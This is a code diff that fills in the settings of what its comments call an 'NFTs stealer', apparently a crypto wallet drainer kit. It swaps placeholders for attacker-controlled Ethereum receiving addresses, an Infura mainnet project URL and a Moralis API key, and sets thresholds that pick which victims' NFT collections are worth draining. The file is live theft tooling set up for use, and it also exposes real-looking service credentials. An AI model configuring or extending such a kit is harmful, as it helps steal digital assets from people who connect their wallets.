@@ -1,7 +1,7 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x390148D1aF497F5e258f1E00f177310fb0Ac1A70";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "wss://mainnet.infura.io/ws/v3/25cff1c9d36f41d681f9d4db77dc10d2"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "THhTeojZZO1VTwPuSankPHbmwCnkalZh5v5P3ByK2dPk1tmXTlUr2Qu13oSgATne"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "Tec.sellix.io",
@@ -34,7 +34,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0xB6C0a4CB5653058fE116e69626c50e0b03718371" // leave empty if you want to use the same address 
 }
 
 /* 
